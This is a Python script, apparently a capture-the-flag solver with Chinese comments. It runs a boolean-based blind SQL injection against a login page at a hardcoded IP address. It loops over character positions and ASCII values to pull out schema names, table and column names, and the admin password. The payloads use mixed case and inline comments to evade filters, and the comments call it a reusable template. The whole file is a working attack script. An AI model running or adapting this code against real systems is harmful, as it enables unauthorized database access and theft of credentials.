# -*- coding: utf-8 -*-
#!/usr/bin/env python



#coding=utf-8



import requests



def login(_username,_password):

    #需要改动处

    url = "http://58.154.33.13:8001/login.php"

    data = {

        "username":_username,

        "password":_password

    }

    response = requests.post(url,data=data)

    content = response.content

    #print content

    #这里是判断盲注的单个字符是否正确的条件，一般这个脚本模板在使用之前要修改此处

    #此题是因为注入username字段，当payload后面的语句正确的时候，返回的是密码错误，如果错误返回用户名错误

    #payload=_username = "amin' or (((asCIi(sUBsTring((sELect/**/passWord/**/From/**/admin/**/where/**/username='admin'),%d,1)))=%d))#" %(i,j)

    if "密码错误" in content:

        return True

    else:

        return False



def main():

    find_name = ""

    # i 表示了所要查找的名字的最大长度

    for i in range(0x50):

        # 0x80=128 , 0x20=32,  32-128为可显示的字符的区间

        for j in range(0x80 , 0x20 , -1):

            #mysql 官方注释  "-- " --后面有空格,或者用 "#"

            #_username = "amin' or (((asCIi(sUBsTring((sELect/**/gROup_conCAt(sCHEma_name)/**/From/**/inFormation_SChema.scHemata),%d,1)))=%d))#" %(i,j)    #此处是payload,需要改动

            #_username = "amin' or (((asCIi(sUBsTring((sELect/**/sCHEma_name/**/From/**/inFormation_SChema.scHemata/**/Limit/**/3,1),%d,1)))=%d))#" %(i,j)

            #_username = "amin' or (((asCIi(sUBsTring((sELect/**/group_concat(Table_name)/**/From/**/inFormation_SChema.tAbles/**/where/**/taBle_schema='sql1'),%d,1)))=%d))#" %(i,j)

            #_username = "amin' or (((asCIi(sUBsTring((sELect/**/group_concat(columN_name)/**/From/**/inFormation_SChema.columns/**/where/**/taBle_naMe='admin'),%d,1)))=%d))#" %(i,j)

            _username = "amin' or (((asCIi(sUBsTring((sELect/**/passWord/**/From/**/admin/**/where/**/username='admin'),%d,1)))=%d))#" %(i,j)

            #_username = "amin' or (ASCII(sUBsTring((user()),%d,1)=%d )) --" %(i,j)

            #_username = "amin'or(((asCIi(sUBString((sELEct/**/group_concat(scheMA_Name)/**/FRom/**/inforMATion_scheMa.schemaTa),%d,1)))=%d))-- " % (i, j)

            #可改动处

            _password="amin"

            print _username

            if login(_username,_password):

                find_name+=chr(j)

                print find_name

                break



main()